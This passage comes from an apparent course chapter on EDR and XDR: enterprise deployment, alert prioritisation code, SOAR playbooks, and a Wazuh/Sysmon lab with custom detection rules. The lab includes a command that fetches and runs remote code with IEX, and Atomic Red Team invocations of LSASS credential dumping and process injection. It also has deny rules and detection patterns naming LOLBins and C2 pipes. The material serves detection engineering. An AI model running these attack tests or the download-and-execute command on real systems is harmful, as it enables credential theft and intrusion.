  <PlatformID>{2E07F7E4-194C-4D20-B7C9-6F44A6C5A234}</PlatformID>
  <Rules>
    <Rule>
      <Option>Enabled:Unsigned System Integrity Policy</Option>
    </Rule>
    <Rule>
      <Option>Enabled:UMCI</Option>  <!-- User Mode Code Integrity -->
    </Rule>
    <Rule>
      <Option>Enabled:Managed Installer</Option>
    </Rule>
  </Rules>
  <EKUs />
  <FileRules>
    <!-- Block known-abused LOLBins from executing in user context -->
    <Deny ID="ID_DENY_MSHTA" FriendlyName="mshta.exe"
          FileName="mshta.exe" MinimumFileVersion="0.0.0.0" />
    <Deny ID="ID_DENY_WSCRIPT" FriendlyName="wscript.exe"
          FileName="wscript.exe" MinimumFileVersion="0.0.0.0" />
  </FileRules>
</SiPolicy>
```

---

## 8. EDR in Ambienti Enterprise

### 8.1 Deployment at Scale

**Deployment architecture for 50,000+ endpoints:**

```
┌────────────────────────────────────────────────────────────┐
│                 ENTERPRISE EDR ARCHITECTURE                  │
│                                                              │
│  ┌─────────────────────────────────────────────────────┐   │
│  │                  Management Plane                     │   │
│  │  ┌──────────┐ ┌───────────┐ ┌───────────────────┐   │   │
│  │  │ Policy   │ │ Group     │ │ Update/Patch      │   │   │
│  │  │ Engine   │ │ Management│ │ Orchestration     │   │   │
│  │  └──────────┘ └───────────┘ └───────────────────┘   │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                              │
│  ┌─────────────────────────────────────────────────────┐   │
│  │                  Data Plane                            │   │
│  │  ┌──────────────┐  ┌────────────┐  ┌─────────────┐  │   │
│  │  │ Telemetry    │  │ Detection  │  │ Response    │  │   │
│  │  │ Ingestion    │  │ Engine     │  │ Actions     │  │   │
│  │  │ (Kafka/      │  │ (Rules +   │  │ (Isolation/ │  │   │
│  │  │  Kinesis)    │  │  ML)       │  │  Remediate) │  │   │
│  │  └──────────────┘  └────────────┘  └─────────────┘  │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                              │
│  ┌─────────────────────────────────────────────────────┐   │
│  │                  Storage Layer                         │   │
│  │  ┌──────────────────┐  ┌──────────────────────────┐  │   │
│  │  │ Hot Storage       │  │ Cold Storage              │  │   │
│  │  │ (7-30 days)       │  │ (90-365 days)            │  │   │
│  │  │ Elasticsearch/    │  │ S3/Azure Blob/GCS        │  │   │
│  │  │ ClickHouse        │  │ Parquet format           │  │   │
│  │  └──────────────────┘  └──────────────────────────┘  │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                              │
│  Endpoints: 50,000+                                          │
│  Telemetry: ~5-15 MB/day/endpoint = 250-750 GB/day          │
│  Events: ~10,000-50,000 events/second sustained              │
└────────────────────────────────────────────────────────────┘
```

**Deployment considerations:**

- Staged rollout: canary group (1%) → pilot (10%) → production (100%)
- Network bandwidth: calculate telemetry volume × endpoint count
- Proxy/PAC configuration for air-gapped segments
- OS compatibility matrix verification before deployment
- Exclusion policy for performance-sensitive applications (databases, build systems)

### 8.2 Policy Management

```yaml
# EDR policy hierarchy example
policy_hierarchy:
  global_baseline:
    name: "Corporate Standard"
    applied_to: "All Endpoints"
    settings:
      prevention_level: moderate
      cloud_intelligence: enabled
      script_control: monitor
      usb_device_control: audit
      network_protection: block_malicious
    
  high_security_override:
    name: "Financial Systems"
    applied_to: "OU=Finance,DC=corp"
    inherits: global_baseline
    overrides:
      prevention_level: aggressive
      script_control: block_unsigned
      usb_device_control: block_all
      application_control: strict_allowlist
    
  developer_exception:
    name: "Engineering Workstations"
    applied_to: "Group=Developers"
    inherits: global_baseline
    overrides:
      script_control: monitor  # Cannot block — breaks workflows
      exclusions:
        paths:
          - "C:\\dev\\*"
          - "C:\\tools\\*"
        processes:
          - "docker.exe"
          - "devenv.exe"
          - "code.exe"
      # CRITICAL: Exclusions are audit-logged and reviewed monthly
```

### 8.3 Alert Fatigue Reduction

The primary operational challenge with EDR is alert volume. A 50,000-endpoint deployment generates thousands of alerts daily. Strategies:

**1. Alert prioritization framework:**

```python
def calculate_alert_priority(alert: dict) -> str:
    """
    Multi-factor alert prioritization to reduce SOC analyst fatigue.
    Considers asset criticality, technique severity, confidence, and context.
    """
    score = 0.0
    
    # Factor 1: Asset criticality (from CMDB)
    asset_criticality = {
        'domain_controller': 10,
        'financial_server': 9,
        'executive_endpoint': 8,
        'developer_workstation': 5,
        'standard_endpoint': 3,
        'test_environment': 1
    }
    score += asset_criticality.get(alert['asset_type'], 3) * 0.3
    
    # Factor 2: MITRE technique severity
    technique_severity = {
        'credential_access': 9,
        'lateral_movement': 8,
        'defense_evasion': 7,
        'persistence': 6,
        'execution': 5,
        'discovery': 3,
        'reconnaissance': 2
    }
    score += technique_severity.get(alert['tactic'], 5) * 0.25
    
    # Factor 3: Detection confidence
    score += alert.get('confidence', 50) / 100.0 * 10 * 0.25
    
    # Factor 4: Correlation (multiple related alerts)
    related_alerts = alert.get('correlated_alert_count', 0)
    score += min(related_alerts * 2, 10) * 0.2
    
    # Threshold mapping
    if score >= 8.0:
        return "CRITICAL"
    elif score >= 6.0:
        return "HIGH"
    elif score >= 4.0:
        return "MEDIUM"
    else:
        return "LOW"
```

**2. Automated triage and enrichment:**

- Auto-close known false positives based on exception rules
- Enrich alerts with threat intelligence (VirusTotal, MISP, OTX)
- Group related alerts into incidents (attack storylines)
- Auto-resolve alerts where automated response already contained the threat

**3. Tuning cycle:**

```
Week 1-2: Deploy in monitor-only mode (no blocking)
Week 3-4: Identify top 20 false positive generators
Week 5-6: Create targeted exclusions (with audit logging)
Week 7-8: Enable prevention mode with tuned policies
Ongoing:  Monthly review of suppressed alerts for missed detections
```

### 8.4 SOC Workflow Integration

```
┌──────────────────────────────────────────────────────────┐
│              SOC INTEGRATION WORKFLOW                      │
│                                                            │
│  EDR Alert ──→ SIEM Correlation ──→ SOAR Playbook         │
│       │              │                    │                 │
│       │              │                    ▼                 │
│       │              │           ┌──────────────┐          │
│       │              │           │ Auto-Enrich  │          │
│       │              │           │ ├─ TI lookup │          │
│       │              │           │ ├─ CMDB query│          │
│       │              │           │ └─ User info │          │
│       │              │           └──────┬───────┘          │
│       │              │                  │                   │
│       │              ▼                  ▼                   │
│       │     ┌───────────────┐  ┌──────────────┐           │
│       │     │ Alert         │  │ Ticket       │           │
│       │     │ Correlation   │  │ Creation     │           │
│       │     │ (same attack) │  │ (ServiceNow) │           │
│       │     └───────────────┘  └──────────────┘           │
│       │                                                    │
│       ▼                                                    │
│  ┌──────────────────────┐                                 │
│  │ Analyst Investigation │                                 │
│  │ ├─ Timeline view      │                                 │
│  │ ├─ Process tree       │                                 │
│  │ ├─ Network graph      │                                 │
│  │ └─ Host isolation?    │                                 │
│  └──────────────────────┘                                 │
└──────────────────────────────────────────────────────────┘
```

### 8.5 SIEM/SOAR Correlation

**Splunk integration with CrowdStrike Falcon:**

```spl
| search index=crowdstrike sourcetype="FalconHost:DetectionSummary"
| where Severity >= 4
| eval technique=mvindex(split(Tactic, ","), 0)
| stats count by ComputerName, DetectName, Severity, technique, UserName
| join type=left ComputerName [
    | inputlookup cmdb_assets.csv
    | rename hostname AS ComputerName
]
| where asset_criticality >= "HIGH"
| sort -Severity, -count
```

**SOAR playbook for EDR alerts (pseudocode):**

```yaml
playbook:
  name: "EDR High-Severity Alert Response"
  trigger: "EDR alert with severity >= HIGH"
  
  steps:
    - name: enrich_iocs
      parallel:
        - action: virustotal_lookup
          input: file_hashes_from_alert
        - action: geoip_lookup
          input: external_ips_from_alert
        - action: cmdb_lookup
          input: hostname_from_alert
        - action: ad_lookup
          input: username_from_alert
    
    - name: assess_risk
      conditions:
        - if: asset_criticality == "CRITICAL" AND confidence >= 80
          then: auto_isolate
        - if: vt_detections >= 5
          then: auto_quarantine_file
        - else: escalate_to_analyst
    
    - name: auto_isolate
      action: edr_isolate_host
      params:
        comment: "Auto-isolated: {{ alert.name }} on {{ hostname }}"
      notify:
        - channel: soc_critical
        - oncall_analyst
    
    - name: collect_evidence
      action: edr_live_response
      script: "collect_forensics.ps1"
      
    - name: create_incident
      action: servicenow_create_incident
      params:
        priority: P1
        category: Security
        subcategory: Malware
        short_description: "{{ alert.name }} on {{ hostname }}"
```

---

## 9. XDR e il Futuro

### 9.1 Extended Detection Across Domains

XDR correlates telemetry across multiple security domains that EDR alone cannot observe:

| Domain | Telemetry Source | Detection Value |
|--------|-----------------|-----------------|
| Endpoint | EDR agent (processes, files, memory, network) | Post-exploitation, lateral movement |
| Email | Mail gateway, M365/Google Workspace | Initial access, phishing delivery |
| Network | NDR sensors, firewall, proxy | C2 communication, data exfiltration |
| Cloud | CASB, cloud audit logs, CSPM | Cloud lateral movement, misconfig exploitation |
| Identity | Azure AD, Okta, on-prem AD | Credential compromise, privilege escalation |

**Cross-domain detection example:**

```
Email domain:     User receives phishing email with malicious link
    │
    ▼ (click event correlated with...)
Identity domain:  Same user authenticates from new device/location 15 min later
    │
    ▼ (session correlated with...)
Endpoint domain:  PowerShell downloads and executes payload on that device
    │
    ▼ (network connection correlated with...)
Network domain:   Beaconing pattern to known C2 infrastructure
    │
    ▼ (cloud API calls from same identity...)
Cloud domain:     Bulk data download from SharePoint/S3

XDR correlation: Single incident, unified kill chain view
EDR alone would see: Process execution + network connection (missing context)
```

### 9.2 Unified Data Lake Architecture

```
┌────────────────────────────────────────────────────────────┐
│                   XDR DATA LAKE                              │
│                                                              │
│  ┌────────────────────────────────────────────────────┐    │
│  │              Ingestion Layer                         │    │
│  │  ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐ │    │
│  │  │Endpoint │ │Email    │ │Network  │ │Cloud    │ │    │
│  │  │(EDR)    │ │Gateway  │ │(NDR)    │ │(CASB)   │ │    │
│  │  └────┬────┘ └────┬────┘ └────┬────┘ └────┬────┘ │    │
│  │       └────────────┼──────────┼────────────┘      │    │
│  └────────────────────┼──────────┼───────────────────┘    │
│                       ▼          ▼                          │
│  ┌────────────────────────────────────────────────────┐    │
│  │         Normalization & Enrichment                   │    │
│  │  ├── Schema normalization (OCSF / ECS / CEF)        │    │
│  │  ├── Entity resolution (user ↔ device ↔ identity)   │    │
│  │  ├── Threat intelligence enrichment                  │    │
│  │  └── Geo/ASN/reputation tagging                     │    │
│  └────────────────────────────────────────────────────┘    │
│                           │                                  │
│                           ▼                                  │
│  ┌────────────────────────────────────────────────────┐    │
│  │              Analytics Engine                        │    │
│  │  ├── Rule-based correlation (cross-domain)          │    │
│  │  ├── ML models (behavioral, anomaly)                │    │
│  │  ├── Graph analytics (entity relationships)         │    │
│  │  └── Automated investigation chains                 │    │
│  └────────────────────────────────────────────────────┘    │
│                           │                                  │
│                           ▼                                  │
│  ┌────────────────────────────────────────────────────┐    │
│  │         Response Orchestration                       │    │
│  │  ├── Isolate endpoint                               │    │
│  │  ├── Disable user account                           │    │
│  │  ├── Block email sender                             │    │
│  │  ├── Add firewall rule                              │    │
│  │  └── Revoke cloud session                           │    │
│  └────────────────────────────────────────────────────┘    │
└────────────────────────────────────────────────────────────┘
```

### 9.3 AI-Driven Investigation

Next-generation XDR platforms employ LLM-augmented investigation:

- **Natural language querying**: Analysts ask "Show me all processes that contacted external IPs after being spawned by Office applications this week" instead of writing complex query syntax
- **Automated root cause analysis**: AI follows the attack graph backward from the alert to identify initial access
- **Predictive threat modeling**: Based on current adversary position, predict likely next steps
- **Auto-generated investigation reports**: Convert technical telemetry into human-readable incident narratives

### 9.4 Emerging Trends

**Identity Threat Detection and Response (ITDR):**
- Monitor authentication flows for anomalies
- Detect token manipulation, session hijacking
- Correlate identity events with endpoint/network

**Cloud-Native Application Protection Platform (CNAPP) integration:**
- Container runtime security (eBPF-based)
- Kubernetes audit log correlation
- Serverless function monitoring
- Infrastructure-as-Code scanning (shift-left)

**Firmware and Hardware-Level Monitoring:**
- UEFI/BIOS integrity verification
- TPM attestation integration
- Below-the-OS threat detection

---

## 10. Laboratorio: EDR Deployment e Testing

### 10.1 Lab Environment Setup

**Architecture:**

```
┌─────────────────────────────────────────────────────────┐
│                    LAB ENVIRONMENT                        │
│                                                           │
│  ┌──────────────────┐    ┌──────────────────────────┐   │
│  │ Wazuh Manager    │    │ Windows 10/11 Endpoint    │   │
│  │ + Indexer        │◄───│ + Wazuh Agent            │   │
│  │ + Dashboard      │    │ + Sysmon                  │   │
│  │ 192.168.56.10    │    │ 192.168.56.20            │   │
│  └──────────────────┘    └──────────────────────────┘   │
│          ▲                                               │
│          │               ┌──────────────────────────┐   │
│          │               │ Linux Server (Ubuntu)     │   │
│          └───────────────│ + Wazuh Agent            │   │
│                          │ + auditd                  │   │
│                          │ 192.168.56.30            │   │
│                          └──────────────────────────┘   │
│                                                           │
│  ┌──────────────────┐                                    │
│  │ Attacker Machine │                                    │
│  │ (Kali/ParrotOS)  │                                    │
│  │ + Atomic Red Team│                                    │
│  │ 192.168.56.50    │                                    │
│  └──────────────────┘                                    │
└─────────────────────────────────────────────────────────┘
```

### 10.2 Wazuh Server Installation

```bash
#!/bin/bash
# deploy_wazuh_server.sh — Wazuh 4.x All-in-One Deployment
# Target: Ubuntu 22.04 LTS (4 CPU, 8GB RAM minimum)

set -euo pipefail

WAZUH_VERSION="4.9.0"

echo "[*] Installing Wazuh ${WAZUH_VERSION} All-in-One"

# Prerequisites
apt-get update && apt-get install -y curl apt-transport-https gnupg2

# Download and run Wazuh installation assistant
curl -sO https://packages.wazuh.com/${WAZUH_VERSION}/wazuh-install.sh
chmod +x wazuh-install.sh

# All-in-one installation (manager + indexer + dashboard)
./wazuh-install.sh -a -i

# Extract dashboard credentials
tar -O -xf wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt

echo "[+] Wazuh installation complete"
echo "[*] Dashboard: https://$(hostname -I | awk '{print $1}')"
echo "[*] Credentials in wazuh-install-files/wazuh-passwords.txt"
```

### 10.3 Sysmon Deployment on Windows Endpoint

```powershell
# deploy_sysmon.ps1 — Deploy Sysmon with EDR-optimized configuration

$SysmonUrl = "https://download.sysinternals.com/files/Sysmon.zip"
$ConfigUrl = "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml"
$InstallPath = "C:\Tools\Sysmon"

# Create installation directory
New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null

# Download Sysmon
$zipPath = Join-Path $InstallPath "Sysmon.zip"
Invoke-WebRequest -Uri $SysmonUrl -OutFile $zipPath
Expand-Archive -Path $zipPath -DestinationPath $InstallPath -Force

# Download configuration
$configPath = Join-Path $InstallPath "sysmonconfig.xml"
Invoke-WebRequest -Uri $ConfigUrl -OutFile $configPath

# Install Sysmon with configuration
$sysmonExe = Join-Path $InstallPath "Sysmon64.exe"
& $sysmonExe -accepteula -i $configPath

# Verify installation
Get-Service Sysmon64 | Select-Object Status, StartType
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5 |
    Select-Object TimeCreated, Id, Message

Write-Output "[+] Sysmon deployed and collecting telemetry"
```

### 10.4 Wazuh Agent Configuration for Sysmon Integration

```xml
<!-- /var/ossec/etc/ossec.conf (Windows agent) — Add Sysmon log collection -->
<ossec_config>
  <localfile>
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>
  
  <!-- PowerShell script block logging -->
  <localfile>
    <location>Microsoft-Windows-PowerShell/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>
  
  <!-- Windows Defender logs -->
  <localfile>
    <location>Microsoft-Windows-Windows Defender/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>
  
  <!-- Security event log (authentication) -->
  <localfile>
    <location>Security</location>
    <log_format>eventchannel</log_format>
    <query>
      <QueryList>
        <Query Id="0" Path="Security">
          <Select Path="Security">*[System[(EventID=4624 or EventID=4625 or 
           EventID=4648 or EventID=4672 or EventID=4688 or EventID=4697 or
           EventID=4698 or EventID=4699 or EventID=4702 or EventID=4720 or
           EventID=4732)]]</Select>
        </Query>
      </QueryList>
    </query>
  </localfile>
</ossec_config>
```

### 10.5 Custom Wazuh Detection Rules

```xml
<!-- /var/ossec/etc/rules/local_rules.xml — Custom EDR detection rules -->

<group name="sysmon,edr_detections">

  <!-- Detect LSASS access (Credential Dumping - T1003.001) -->
  <rule id="100100" level="14">
    <if_sid>61612</if_sid>  <!-- Sysmon Event ID 10 -->
    <field name="win.eventdata.targetImage" type="pcre2">(?i)\\lsass\.exe$</field>
    <field name="win.eventdata.grantedAccess" type="pcre2">0x1F[01]FFF|0x143A|0x1410|0x1010</field>
    <description>CRITICAL: Process accessing LSASS memory - possible credential dumping (T1003.001)</description>
    <mitre>
      <id>T1003.001</id>
    </mitre>
    <options>no_full_log</options>
    <group>credential_access,attack,</group>
  </rule>

  <!-- Detect encoded PowerShell execution (T1059.001) -->
  <rule id="100101" level="12">
    <if_sid>61603</if_sid>  <!-- Sysmon Event ID 1 - Process Create -->
    <field name="win.eventdata.image" type="pcre2">(?i)powershell|pwsh</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)-[eE][nN]?[cC]?\s|[A-Za-z0-9+/=]{100,}</field>
    <description>HIGH: Encoded PowerShell command execution detected (T1059.001)</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
    <group>execution,attack,</group>
  </rule>

  <!-- Detect CreateRemoteThread injection (T1055) -->
  <rule id="100102" level="14">
    <if_sid>61618</if_sid>  <!-- Sysmon Event ID 8 -->
    <field name="win.eventdata.sourceImage" type="pcre2">(?i)(?!.*\\(csrss|services|lsass|svchost)\.exe$)</field>
    <description>CRITICAL: Remote thread creation detected - possible process injection (T1055)</description>
    <mitre>
      <id>T1055</id>
    </mitre>
    <group>defense_evasion,attack,</group>
  </rule>

  <!-- Detect suspicious named pipe creation (C2 indicator) -->
  <rule id="100103" level="10">
    <if_sid>61625</if_sid>  <!-- Sysmon Event ID 17/18 - Pipe -->
    <field name="win.eventdata.pipeName" type="pcre2">(?i)\\(MSSE-|postex_|status_|msagent_|gruntsvc)</field>
    <description>HIGH: Suspicious named pipe detected - possible C2 channel (T1572)</description>
    <mitre>
      <id>T1572</id>
    </mitre>
    <group>command_and_control,attack,</group>
  </rule>

  <!-- Detect scheduled task creation for persistence (T1053.005) -->
  <rule id="100104" level="10">
    <if_sid>61603</if_sid>  <!-- Sysmon Event ID 1 -->
    <field name="win.eventdata.image" type="pcre2">(?i)schtasks\.exe</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)/create\s.*(/sc\s|/tn\s)</field>
    <description>HIGH: Scheduled task creation detected - possible persistence (T1053.005)</description>
    <mitre>
      <id>T1053.005</id>
    </mitre>
    <group>persistence,attack,</group>
  </rule>

  <!-- Detect WMI event subscription persistence (T1546.003) -->
  <rule id="100105" level="12">
    <if_sid>61637</if_sid>  <!-- Sysmon Event ID 19/20/21 - WMI -->
    <description>HIGH: WMI event subscription created - possible persistence (T1546.003)</description>
    <mitre>
      <id>T1546.003</id>
    </mitre>
    <group>persistence,attack,</group>
  </rule>

  <!-- Detect LOLBin network connections -->
  <rule id="100106" level="10">
    <if_sid>61605</if_sid>  <!-- Sysmon Event ID 3 - Network -->
    <field name="win.eventdata.image" type="pcre2">(?i)\\(certutil|mshta|regsvr32|rundll32|msbuild|installutil)\.exe$</field>
    <field name="win.eventdata.initiated">true</field>
    <description>HIGH: LOLBin initiated network connection - possible download/C2 (T1218)</description>
    <mitre>
      <id>T1218</id>
    </mitre>
    <group>defense_evasion,execution,attack,</group>
  </rule>

  <!-- Detect timestamp stomping (T1070.006) -->
  <rule id="100107" level="8">
    <if_sid>61604</if_sid>  <!-- Sysmon Event ID 2 - FileCreateTime -->
    <field name="win.eventdata.image" type="pcre2">(?i)(?!.*(svchost|tiworker|msiexec|trustedinstaller))</field>
    <description>MEDIUM: File creation time modified - possible timestamp stomping (T1070.006)</description>
    <mitre>
      <id>T1070.006</id>
    </mitre>
    <group>defense_evasion,attack,</group>
  </rule>

  <!-- Correlation: Multi-stage attack chain -->
  <rule id="100200" level="15" frequency="3" timeframe="300">
    <if_matched_group>attack</if_matched_group>
    <same_field>win.eventdata.user</same_field>
    <description>CRITICAL: Multiple attack indicators from same user within 5 minutes - active compromise</description>
    <group>correlation,active_attack,</group>
  </rule>

</group>
```

### 10.6 Atomic Red Team Testing

Atomic Red Team provides small, portable detection tests mapped to MITRE ATT&CK:

```powershell
# Install Atomic Red Team on the attacker machine (or test endpoint)
IEX (Invoke-WebRequest 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics

# Import the module
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1"

# --- Run specific tests and verify EDR detection ---

# T1003.001 - Credential Dumping: LSASS Memory (Mimikatz pattern)
Invoke-AtomicTest T1003.001 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 1
# Expected detection: Wazuh rule 100100 should fire

# T1059.001 - PowerShell: Encoded command execution
Invoke-AtomicTest T1059.001 -TestNumbers 1
# Expected detection: Wazuh rule 100101 should fire

# T1053.005 - Scheduled Task/Job: Scheduled Task
Invoke-AtomicTest T1053.005 -TestNumbers 1
# Expected detection: Wazuh rule 100104 should fire

# T1218.005 - Mshta: Execute via mshta
Invoke-AtomicTest T1218.005 -TestNumbers 1
# Expected detection: Wazuh rule 100106 (LOLBin network) should fire

# T1055.001 - Process Injection: DLL Injection
Invoke-AtomicTest T1055.001 -TestNumbers 1
# Expected detection: Wazuh rule 100102 should fire

# Cleanup after testing
Invoke-AtomicTest T1003.001 -TestNumbers 1 -Cleanup
Invoke-AtomicTest T1059.001 -TestNumbers 1 -Cleanup
Invoke-AtomicTest T1053.005 -TestNumbers 1 -Cleanup
```

### 10.7 Telemetry Analysis Script

```python
#!/usr/bin/env python3
"""
edr_telemetry_analyzer.py
Analyzes Wazuh alerts for attack patterns and generates detection coverage report.
Connects to Wazuh Indexer (OpenSearch) API.
"""

import json
import sys
from datetime import datetime, timedelta, timezone
from collections import defaultdict
from typing import Any

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

WAZUH_INDEXER = "https://192.168.56.10:9200"
INDEXER_USER = "admin"
INDEXER_PASS = "CHANGE_ME"  # Retrieved from wazuh-passwords.txt

MITRE_TACTICS = {
    "TA0001": "Initial Access",
    "TA0002": "Execution",
    "TA0003": "Persistence",
    "TA0004": "Privilege Escalation",
    "TA0005": "Defense Evasion",
    "TA0006": "Credential Access",
    "TA0007": "Discovery",
    "TA0008": "Lateral Movement",
    "TA0009": "Collection",
    "TA0010": "Exfiltration",
    "TA0011": "Command and Control",
}


def query_wazuh_alerts(hours_back: int = 24) -> list[dict[str, Any]]:
    """Query Wazuh Indexer for recent security alerts."""
    now = datetime.now(timezone.utc)
    start_time = now - timedelta(hours=hours_back)
    
    index_pattern = f"wazuh-alerts-4.x-{now.strftime('%Y.%m')}*"
    
    query = {
        "size": 10000,
        "query": {
            "bool": {
                "must": [
                    {"range": {"timestamp": {"gte": start_time.isoformat(), "lte": now.isoformat()}}},
                    {"range": {"rule.level": {"gte": 10}}}
                ],
                "should": [
                    {"exists": {"field": "rule.mitre.id"}}
                ]
            }
        },
        "sort": [{"timestamp": "desc"}],
        "_source": [
            "timestamp", "rule.id", "rule.level", "rule.description",
            "rule.mitre.id", "rule.mitre.tactic", "agent.name",
            "data.win.eventdata.image", "data.win.eventdata.commandLine",
            "data.win.eventdata.targetImage", "data.win.eventdata.user"
        ]
    }
    
    response = requests.post(
        f"{WAZUH_INDEXER}/{index_pattern}/_search",
        json=query,
        auth=(INDEXER_USER, INDEXER_PASS),
        verify=False,
        timeout=30
    )
    response.raise_for_status()
    
    hits = response.json().get("hits", {}).get("hits", [])
    return [hit["_source"] for hit in hits]


def analyze_attack_coverage(alerts: list[dict]) -> dict:
    """Analyze MITRE ATT&CK coverage from detected alerts."""
    coverage = defaultdict(lambda: {"count": 0, "techniques": defaultdict(int), "alerts": []})
    
    for alert in alerts:
        mitre_data = alert.get("rule", {}).get("mitre", {})
        techniques = mitre_data.get("id", [])
        tactics = mitre_data.get("tactic", [])
        
        if not isinstance(techniques, list):
            techniques = [techniques]
        if not isinstance(tactics, list):
            tactics = [tactics]
        
        for tactic in tactics:
            coverage[tactic]["count"] += 1
            for technique in techniques:
                coverage[tactic]["techniques"][technique] += 1
            coverage[tactic]["alerts"].append({
                "timestamp": alert.get("timestamp"),
                "description": alert.get("rule", {}).get("description"),
                "level": alert.get("rule", {}).get("level"),
                "agent": alert.get("agent", {}).get("name")
            })
    
    return dict(coverage)


def generate_report(coverage: dict, total_alerts: int) -> str:
    """Generate detection coverage report."""
    report_lines = [
        "=" * 70,
        f"  EDR DETECTION COVERAGE REPORT",
        f"  Generated: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}",
        f"  Total High-Severity Alerts: {total_alerts}",
        "=" * 70,
        ""
    ]
    
    for tactic, data in sorted(coverage.items(), key=lambda x: x[1]["count"], reverse=True):
        tactic_name = MITRE_TACTICS.get(tactic, tactic)
        report_lines.append(f"\n{'─' * 50}")
        report_lines.append(f"  {tactic} - {tactic_name}")
        report_lines.append(f"  Detections: {data['count']}")
        report_lines.append(f"{'─' * 50}")
        
        for technique, count in sorted(data["techniques"].items(), key=lambda x: x[1], reverse=True):
            report_lines.append(f"    {technique}: {count} detections")
        
        # Show latest 3 alerts
        report_lines.append(f"\n    Latest alerts:")
        for alert in data["alerts"][:3]:
            report_lines.append(
                f"      [{alert['timestamp']}] Level {alert['level']}: "
                f"{alert['description']} ({alert['agent']})"
            )
    
    return "\n".join(report_lines)


def identify_attack_chains(alerts: list[dict]) -> list[dict]:
    """Identify correlated attack chains from sequential alerts."""
    chains = []
    
    # Group alerts by agent and time windows (5-minute windows)
    agent_alerts = defaultdict(list)
    for alert in alerts:
        agent = alert.get("agent", {}).get("name", "unknown")
        agent_alerts[agent].append(alert)
    
    for agent, agent_alert_list in agent_alerts.items():
        if len(agent_alert_list) >= 3:
            # Multiple alerts from same agent = potential attack chain
            techniques = set()
            for a in agent_alert_list:
                mitre_ids = a.get("rule", {}).get("mitre", {}).get("id", [])
                if isinstance(mitre_ids, list):
                    techniques.update(mitre_ids)
                else:
                    techniques.add(mitre_ids)
            
            if len(techniques) >= 2:
                chains.append({
                    "agent": agent,
                    "alert_count": len(agent_alert_list),
                    "techniques": list(techniques),
                    "timespan": f"{agent_alert_list[-1].get('timestamp')} → {agent_alert_list[0].get('timestamp')}",
                    "severity": "CRITICAL" if len(techniques) >= 4 else "HIGH"
                })
    
    return chains


def main():
    print("[*] Querying Wazuh Indexer for alerts (last 24h)...")
    
    try:
        alerts = query_wazuh_alerts(hours_back=24)
    except requests.exceptions.ConnectionError:
        print("[!] Cannot connect to Wazuh Indexer. Verify network and credentials.")
        sys.exit(1)
    
    print(f"[+] Retrieved {len(alerts)} high-severity alerts")
    
    if not alerts:
        print("[*] No alerts found in the specified timeframe.")
        return
    
    # Analyze coverage
    coverage = analyze_attack_coverage(alerts)
    report = generate_report(coverage, len(alerts))
    print(report)
    
    # Identify attack chains
    chains = identify_attack_chains(alerts)
    if chains:
        print(f"\n{'=' * 70}")
        print(f"  ATTACK CHAIN DETECTION")
        print(f"{'=' * 70}")
        for chain in chains:
            print(f"\n  [{chain['severity']}] Agent: {chain['agent']}")
            print(f"  Alerts: {chain['alert_count']} | Techniques: {', '.join(chain['techniques'])}")
            print(f"  Timespan: {chain['timespan']}")


if __name__ == "__main__":
    main()
```

### 10.8 Detection Validation Matrix

After running Atomic Red Team tests, validate detection coverage:

```yaml
# detection_validation_matrix.yaml
# Run after Atomic Red Team tests to verify EDR detection

validation_results:
  test_date: "2025-03-20"
  environment: "Wazuh 4.9 + Sysmon 15.x"
  
  tests:
    - technique: T1003.001
      name: "LSASS Memory Credential Dumping"
      atomic_test: "T1003.001 Test #1"
      expected_rule: 100100
      detected: true
      latency_seconds: 3
      alert_level: 14
      notes: "Detected via Sysmon Event 10 + access mask correlation"
    
    - technique: T1059.001
      name: "Encoded PowerShell Execution"
      atomic_test: "T1059.001 Test #1"
      expected_rule: 100101
      detected: true
      latency_seconds: 1
      alert_level: 12
      notes: "Base64 pattern matched in command line"
    
    - technique: T1053.005
      name: "Scheduled Task Persistence"
      atomic_test: "T1053.005 Test #1"
      expected_rule: 100104
      detected: true
      latency_seconds: 2
      alert_level: 10
      notes: "schtasks /create pattern detected"
    
    - technique: T1055.001
      name: "DLL Injection via CreateRemoteThread"
      atomic_test: "T1055.001 Test #1"
      expected_rule: 100102
      detected: true
      latency_seconds: 1
      alert_level: 14
      notes: "Sysmon Event 8 captured remote thread creation"
    
    - technique: T1218.005
      name: "Mshta Execution"
      atomic_test: "T1218.005 Test #1"
      expected_rule: 100106
      detected: true
      latency_seconds: 2
      alert_level: 10
      notes: "LOLBin network connection rule triggered"
    
    - technique: T1070.006
      name: "Timestamp Stomping"
      atomic_test: "T1070.006 Test #1"
      expected_rule: 100107
      detected: true
      latency_seconds: 1
      alert_level: 8
      notes: "Sysmon Event 2 file time change"
    
    - technique: T1055.012
      name: "Process Hollowing"
      atomic_test: "T1055.012 Test #1"
      expected_rule: "Sysmon Event 25"
      detected: true
      latency_seconds: 1
      alert_level: 12
      notes: "ProcessTampering event fired"

  coverage_summary:
    total_techniques_tested: 7
    detected: 7
    missed: 0
    detection_rate: "100%"
    average_latency: "1.6 seconds"
    
  gaps_identified:
    - technique: T1055.004
      name: "Asynchronous Procedure Call Injection"
      status: "No dedicated rule — requires custom development"
    - technique: T1620
      name: "Reflective Code Loading"
      status: "Partially detected via memory scanning, no Sysmon event"
    - technique: T1134.001
      name: "Token Impersonation"
      status: "Requires additional ETW provider integration"
```

